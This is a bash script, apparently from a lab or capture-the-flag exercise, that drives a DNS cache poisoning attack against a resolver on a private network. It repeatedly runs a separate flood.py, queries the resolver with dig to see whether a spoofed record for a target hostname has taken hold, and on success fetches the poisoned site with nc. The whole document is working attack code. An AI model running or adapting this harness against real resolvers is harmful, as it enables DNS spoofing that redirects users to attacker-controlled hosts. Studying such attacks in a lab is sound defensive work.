for ((n=0;n<1000;n++)); do
	ls |grep "flood" > fail1.txt
	while [[ -s fail1.txt ]] ; do
		echo "`date -u` Running dns cache poisioning attack"
		python flood.py
		dig @172.17.152.149 whenry_49094902fea7938f.propaganda.hc > data1.txt
		grep "172.17.152.146" data1.txt > dig1.txt 
		grep "no servers could be reached" data1.txt >fail1.txt;
		if [[ -s fail1.txt ]] ; then
			echo "`date -u` no server reached"
		else
			grep "SERVFAIL" data1.txt > fail1.txt
			if [[ -s fail1.txt ]] ; then
				echo "SERVFAIL error. Question sent back"
			fi ;
		fi ;		
	done
	if [[ -s dig1.txt ]] ; then
	echo "FAIL"     
	else
	printf "GET / HTTP/1.0\r\nHost: whenry_49094902fea7938f.propaganda.hc\r\n\r\n" | nc 172.17.152.149 80 > success1.txt
	echo "SUCCESS" 
	break
	fi ; 
	sleep 1m;
done
